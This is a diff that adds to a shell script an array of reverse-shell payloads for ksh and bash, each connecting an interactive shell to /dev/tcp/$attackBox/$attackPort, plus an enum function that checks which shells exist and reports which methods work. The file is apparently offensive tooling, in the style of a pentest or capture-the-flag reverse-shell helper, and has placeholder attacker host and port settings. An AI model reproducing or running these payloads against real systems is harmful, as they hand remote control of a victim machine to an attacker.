@@ -2,7 +2,34 @@
 
 # Modular version
 
+methods=( "ksh,if ksh -c 'exit',ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
+	"bash,if bash -c 'exit',bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
+	)
 
+enum() {
+	echo "Enuming methods avaliable"
+	IFS=":"
+	for s in ${methods[@]};
+	do
+		method=$(echo $s | awk -F ',' '{print $1}')
+		eval_statement=$(echo $s | awk -F ',' '{print $2}' | sed 's/^...//g')
+		payload=$(echo $s | awk -F ',' '{print $3}')
+		if $(echo $method | grep -qi "[a-z]")
+		then
+			echo "method = " $method
+			echo "eval staement = " $eval_statement
+			echo "payload = " $payload
+			echo
+			$eval_statement | $SHELL
+			if [ $? -eq 0 ];
+			then
+				echo $method "works"
+			fi
+		fi
+	done
+}
+
+enum
 
 #attackBox=0.0.0.0
 #attackPort=5253
